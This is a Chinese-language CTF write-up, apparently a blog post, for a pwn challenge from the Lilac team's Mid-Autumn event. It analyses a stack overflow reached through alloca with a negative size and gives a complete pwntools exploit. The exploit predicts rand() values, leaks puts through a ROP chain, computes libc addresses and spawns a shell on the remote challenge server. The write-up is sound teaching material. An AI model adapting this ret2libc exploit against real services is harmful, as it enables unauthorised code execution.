# Lilac Mid Autum Fun




# Lilac

>  HIT本部的ctf战队Lilac的中秋活动，只有三道PWN。

<!-- more -->

# PWN1

## checksec

```shell
[*] '/home/giantbranch/Desktop/pwn/mid-autum-fun1/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## ida

向v7中写入v6大小的数据，遇到回车结束。v6就是我们用alloca在栈上申请的大小。

为了保证v6大小能让我们完整的写入payload所以这里给它一个很大的数，“-31”，反正我们不用把所有的申请空间填满。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"
from ctypes import *
libc1=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

local=0
offset=0x14-3+8-1
if local:
	p=process('./pwn')
	elf = ELF('./pwn')
else:
	p=remote('47.94.239.235',3001)
	elf = ELF('./pwn')

#guess number
def guess():
	libc1.srand(0X91D)
	for i in range(66):
    		num=str(libc1.rand())
    		p.sendlineafter("guess next number :",num)

#gdb.attach(p)
guess()
p.recvuntil("size of you name :")
p.sendline('-31')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_rdi=0x0000000000400b53
main=0x000000000040099C
#gdb.attach(p)

payload='a'*offset+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload)
p.recvline()
puts_addr=u64(p.recv(6).ljust(8, '\x00'))
print hex(puts_addr)
sleep(0.5)

libcbase=puts_addr-0x06f6a0
system=libcbase+0x0453a0
bin_sh=libcbase+0x18ce17
print hex(puts_addr)

guess()
p.recvuntil("size of you name :")
p.sendline('-31')
#gdb.attach(p)
payload='a'*offset+p64(pop_rdi)+p64(bin_sh)+p64(system)
p.sendline(payload)

p.interactive()
```

## 总结

题目不难，这里主要介绍两个工具

**gdb.attach(p)**：这个命令可以让你在执行脚本的时候再为你开启一个终端，供你进行动态调试。这样我们就可以知道自己的脚本在哪一步出了问题。**~~强推~~**

**libc database search**：LibcSearch虽然感觉很方便，但是它的libc库不算全，这个工具可以让你通过最后三位的偏移确定libc的版本。

